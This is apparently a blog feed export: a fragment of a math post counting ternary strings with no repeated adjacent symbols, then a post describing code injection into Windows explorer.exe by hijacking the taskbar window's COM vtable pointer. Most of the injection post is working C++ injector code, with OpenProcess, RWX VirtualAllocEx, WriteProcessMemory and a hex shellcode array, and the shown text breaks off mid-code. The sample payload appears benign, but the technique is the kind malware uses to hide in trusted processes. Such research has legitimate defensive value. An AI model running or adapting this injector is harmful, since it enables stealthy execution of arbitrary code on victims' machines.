&lt;p&gt;$$ {\lbrack\epsilon\rbrack}_n = {\lbrack 0\rbrack}_{n-1} + {\lbrack 1\rbrack}_{n-1} + {\lbrack 2\rbrack}_{n-1} \\ {\lbrack 0\rbrack}_n = {\lbrack \phi\rbrack}_{n-1} + {\lbrack 1\rbrack}_{n-1} + {\lbrack 2\rbrack}_{n-1} \\ {\lbrack 1\rbrack}_n = {\lbrack \phi\rbrack}_{n-1} + {\lbrack 0\rbrack}_{n-1} + {\lbrack 2\rbrack}_{n-1} \\ {\lbrack 2\rbrack}_n = {\lbrack \phi\rbrack}_{n-1} + {\lbrack 0\rbrack}_{n-1} + {\lbrack 1\rbrack}_{n-1} \\ {\lbrack \phi\rbrack}_n = {\lbrack \phi\rbrack}_{n-1} + {\lbrack \phi\rbrack}_{n-1} + {\lbrack \phi\rbrack}_{n-1} = 3{\lbrack\phi\rbrack}_{n-1} $$&lt;/p&gt;
&lt;p&gt;$$ {\lbrack\epsilon\rbrack}_0 = {\lbrack 0\rbrack}_0 = {\lbrack 1\rbrack}_0 = {\lbrack 2\rbrack}_0 = 1 \\ {\lbrack\phi\rbrack}_0 = 0 $$&lt;/p&gt;
&lt;p&gt;We have \({\lbrack\phi\rbrack}_n\ = 0\), so we can simplify the above recurrences&lt;/p&gt;
&lt;p&gt;$$ {\lbrack\epsilon\rbrack}_n = {\lbrack 0\rbrack}_{n-1} + {\lbrack 1\rbrack}_{n-1} + {\lbrack 2\rbrack}_{n-1} $$ $$ \tag{1} {\lbrack 0\rbrack}_n = {\lbrack 1\rbrack}_{n-1} + {\lbrack 2\rbrack}_{n-1} $$ $$ \tag{2} {\lbrack 1\rbrack}_n = {\lbrack 0\rbrack}_{n-1} + {\lbrack 2\rbrack}_{n-1} $$ $$ \tag{3} {\lbrack 2\rbrack}_n = {\lbrack 0\rbrack}_{n-1} + {\lbrack 1\rbrack}_{n-1} $$&lt;/p&gt;
&lt;p&gt;Adding \(1\), \(2\) and \(3\), we have&lt;/p&gt;
&lt;p&gt;$$ {\lbrack 012\rbrack}_n = {\lbrack 0\rbrack}_n + {\lbrack 1\rbrack}_n + {\lbrack 2\rbrack}_n = 2{\lbrack 012\rbrack}_{n-1} = 2^{n}{\lbrack 012\rbrack}_0 = 3\cdot 2^n $$&lt;/p&gt;
&lt;p&gt;$$ {\lbrack\epsilon\rbrack}_n = {\lbrack 012\rbrack}_{n-1} = \begin{cases} 1 &amp;amp;\text{if n = 0} \\ 3\cdot 2^{n-1} &amp;amp;\text{n &amp;gt; 0} \end{cases} $$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Alt Proof.: We can place 0, 1, or 2 in the first place in 3 ways. And for the remaining places, we must make sure not to place the previous symbol, so, 2 ways for every other place. Implies \(3\cdot 2^{n-1}\) ways in total.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Code Injection: Windows Taskbar</title>
        <link>http://localhost:1313/post/code-injection-mstasklist/</link>
        <pubDate>Tue, 06 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/post/code-injection-mstasklist/</guid>
        <description>&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;p&gt;I will be describing how to inject arbritary code into explorer.exe using the Taskbar.&lt;br&gt;
I was looking in the taskbar &lt;code&gt;MSTaskListWClass&lt;/code&gt;, and I found a valid pointer in the &amp;ldquo;Extra Window Bytes&amp;rdquo; for the &amp;ldquo;Running applications&amp;rdquo; window.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inject-tasklist/i0.png&#34; alt=&#34;i0&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;Running applications&amp;rdquo; window is the area just after the start button&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inject-tasklist/i1.png&#34; alt=&#34;i1&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I attached x64dbg to explorer.exe, and voila, it&amp;rsquo;s pointing to a COM vtable.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inject-tasklist/i2.png&#34; alt=&#34;i2&#34;  /&gt;
&lt;img src=&#34;http://localhost:1313/images/inject-tasklist/i3.png&#34; alt=&#34;i3&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;To get a clear view, I opened explorer in ida (with the pdb), and here&amp;rsquo;s the vtable&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inject-tasklist/i4.png&#34; alt=&#34;i4&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Xrefs to &lt;code&gt;MSTaskListWClass&lt;/code&gt; in ida, gives &lt;code&gt;CTaskListWnd::_RegisterWindowClass(void)&lt;/code&gt; and &lt;code&gt;CTaskListWnd::Initialize&lt;/code&gt;. It is important to look into &lt;code&gt;_RegisterWindowClass&lt;/code&gt; because we want to understand the Window Callback for this class.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inject-tasklist/i5.png&#34; alt=&#34;i5&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inject-tasklist/i6.png&#34; alt=&#34;i6&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Here, &lt;code&gt;kernel32!GetWindowLongW&lt;/code&gt; returns a pointer to vtable that has three functions - &lt;code&gt;AddRef&lt;/code&gt;, &lt;code&gt;Release&lt;/code&gt; and &lt;code&gt;WndProc&lt;/code&gt;. &lt;code&gt;AddRef&lt;/code&gt; is called first, followed by the Window Procedure and &lt;code&gt;Release&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now, this vtable is in &lt;code&gt;rdata&lt;/code&gt; section. But the pointer to the vtable (the address stored in the extra window bytes), is writeable.&lt;/p&gt;
&lt;p&gt;So, we allocate a rwx page in &lt;code&gt;explorer.exe&lt;/code&gt; to store the shellcode and the payload and the new vtable. The new vtable is same as the existing vtable but the &lt;code&gt;Release&lt;/code&gt; pointer points to the shellcode.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;mov rax, offset shellcode
call rax
mov rax, 0xaabbccddeeff
jmp rax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Source Code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;Stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;TlHelp32.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;vector&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#pragma comment(lib, &amp;#34;user32&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
LPCTSTR &lt;span style=&#34;color:#447fcf&#34;&gt;pid2name&lt;/span&gt;(DWORD dwPid)
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; procName[&lt;span style=&#34;color:#3677a9&#34;&gt;261&lt;/span&gt;];
    HANDLE hSnapshot;
    PROCESSENTRY32 entry;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (Process32First(hSnapshot, &amp;amp;entry))
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;do&lt;/span&gt;
        {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (entry.th32ProcessID == dwPid)
            {
                lstrcpy(procName, entry.szExeFile);
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; procName;
            }
        }
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (Process32Next(hSnapshot, &amp;amp;entry));
    }

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;(none)&amp;#34;&lt;/span&gt;;
}

HWND g_hwndMSTaskListWClass;

BOOL WINAPI &lt;span style=&#34;color:#447fcf&#34;&gt;EnumProc&lt;/span&gt;(HWND hWnd, LPARAM lP)
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; szClass[&lt;span style=&#34;color:#3677a9&#34;&gt;128&lt;/span&gt;];
    GetWindowText(hWnd, szClass, &lt;span style=&#34;color:#3677a9&#34;&gt;127&lt;/span&gt;);
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (!lstrcmp(szClass, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Running applications&amp;#34;&lt;/span&gt;))
    {
        g_hwndMSTaskListWClass = hWnd;
    }
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; TRUE;
}

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; {
    UINT64 pfnAddRef;
    UINT64 pfnRelease;
    UINT64 pfnWndProc;
} CImpWndProc;

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;()
{
    HWND hw = &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;;
    DWORD dwPid;
    SIZE_T nRead;

    HWND hwShellTray = FindWindowEx(&lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Shell_TrayWnd&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;);
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[&amp;lt;] ShellTrayWnd: %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, hwShellTray);

    EnumChildWindows(hwShellTray, EnumProc, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;);

    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Running applications: %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, g_hwndMSTaskListWClass);
    GetWindowThreadProcessId(g_hwndMSTaskListWClass, &amp;amp;dwPid);
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] ProcessId: %d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, pid2name(dwPid), dwPid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Handle: %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, hProcess);

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;auto&lt;/span&gt; m_windowPtr = GetWindowLongPtr(g_hwndMSTaskListWClass, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] VTable Ptr Ptr: %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, (PVOID)m_windowPtr);

    CImpWndProc m_vTable {};
    UINT64 ptrVTable;
    ReadProcessMemory(hProcess, PVOID(m_windowPtr), &amp;amp;ptrVTable, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt; ptrVTable, &amp;amp;nRead);
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] VTable Ptr: %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, PVOID(ptrVTable));
    ReadProcessMemory(hProcess, PVOID(ptrVTable), &amp;amp;m_vTable, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt; m_vTable, &amp;amp;nRead);
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[CImpWndProc.AddRef] -&amp;gt; %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, m_vTable.pfnAddRef);
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[CImpWndProc.Release] -&amp;gt; %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, m_vTable.pfnRelease);
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[CImpWndProc.WndProc] -&amp;gt; %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, m_vTable.pfnWndProc);

    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// shellcode
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// -------------------------
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// mov rax, addr of shellcode
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// call rax
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// mov rax, old_release_vptr
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// jmp rax
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// -------------------------
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; payload[] = {
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x53&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x51&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x52&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x56&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x50&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x51&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x52&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x53&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x54&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x56&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x48&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x48&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0xFF&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x51&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x48&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x83&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xF8&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x03&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x7D&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x34&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xC9&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xE8&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x48&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x64&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x21&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5A&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xE8&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x30&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0xB9&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x40&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x48&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x21&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xFF&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xD0&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5D&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5C&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5A&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x58&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x5D&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5A&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xC3&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xE0&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x2C&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x0B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xD3&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xF9&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x7F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x00&lt;/span&gt;
    };
    size_t payloadSize = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt; payload;

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;auto&lt;/span&gt; vTableMem = (UINT64) VirtualAllocEx(
        hProcess, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;32&lt;/span&gt;,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
    );
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;New VTable: %p&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, vTableMem);
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;auto&lt;/span&gt; vMem = (UINT64) VirtualAllocEx(
        hProcess, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;4096&lt;/span&gt;,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
    );
    WriteProcessMemory(hProcess, PVOID(vMem), payload, payloadSize, &amp;amp;nRead);

    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Payload Addr: %#016lx&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, vMem);

    std::vector&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;&amp;gt; shellcode;

    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// mov rax, vMem
